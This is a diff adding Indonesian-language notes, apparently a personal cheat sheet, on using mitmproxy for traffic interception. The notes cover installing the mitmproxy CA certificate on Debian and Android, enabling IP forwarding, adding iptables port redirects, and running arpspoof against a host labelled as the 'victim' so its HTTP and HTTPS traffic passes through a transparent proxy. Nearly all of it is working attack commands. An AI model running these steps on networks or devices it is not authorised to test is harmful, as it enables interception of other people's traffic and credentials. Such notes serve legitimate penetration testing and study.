@@ -1,0 +1,62 @@
+Antarmuka baris perintah (CLI) memiliki ikatan kunci seperti VIM. 
+- q akan berhenti, 
+- tombol panah atau h, j, k, l akan memindahkan Anda ke atas dan ke bawah melalui daftar permintaan. 
+- ? akan memuat bantuan,
+- <<enter>> akan menelusuri permintaan tertentu.
+
+# Installing The Cert on Debian Based Linux Distributions
+$ mkdir /usr/local/share/ca-certificates/extra
+$ cp ~/.mitmproxy/mitmproxy-ca-cert.cer /usr/local/share/ca-certificates/extra/mitmproxy-ca-cert.crt
+$ update-ca-certificates
+
+#### onno
+
+Install CA
+Kalau mau benar2 menipu browser, kita perlu menginstalasi CA Certificate MITMproxy, dari
+
+~/.mitmproxy/mitmproxy-ca-cert.,
+
+/sdcard/Download/mitmproxy-ca-cert.cer
+Masuk ke menu android
+
+Settings > Security > “Install from device storage”
+Masukan “mitmproxy-ca-cert” (tanpa suffix!) > click “OK”
+Klik “Trusted credentials” > Pilih “User” tab.
+
+Certificate harusnya akan muncul di list.
+
+## Redirect IP
+
+# ARPspoofing supaya gampang misalnya,
+> arpspoof -i <interface> -t <target> <IP router/gateway/server>
+> arpspoof -i eth0 -t 192.168.0.106 192.168.0.100
+> 192.168.0.106 = ip victim
+> 192.168.0.100 = ip router / gateway / server yang akan di monitor
+
+# mitmproxy secara internal run pada port 8080. Untuk menangkap traffic port 80/HTTP atau port 443/HTTPS, lakukan redirect port menggunakan,
+
+$ echo 1 > /proc/sys/net/ipv4/ip_forward
+> sysctl -w net.ipv4.ip_forward=1
+> iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+> iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+#Atau jika menggunakan Wifi / wlan0
+
+$ echo 1 > /proc/sys/net/ipv4/ip_forward
+> sysctl -w net.ipv4.ip_forward=1
+> iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+> iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+> arpspoof -i wlan0 -t 192.168.0.10 192.168.0.100
+> arpspoof -i wlan0 -t 192.168.0.100 192.168.0.10
+
+Jalankan mitmproxy
+
+Pastikan server sasaran memang menjalankan HTTPS juga ingin mem-proxy traffic port 443.
+
+Jalankan transparan proxy
+
+$ mitmproxy --mode transparent --ssl-insecure
+
+versi lama
+
+$ mitmproxy -T --host
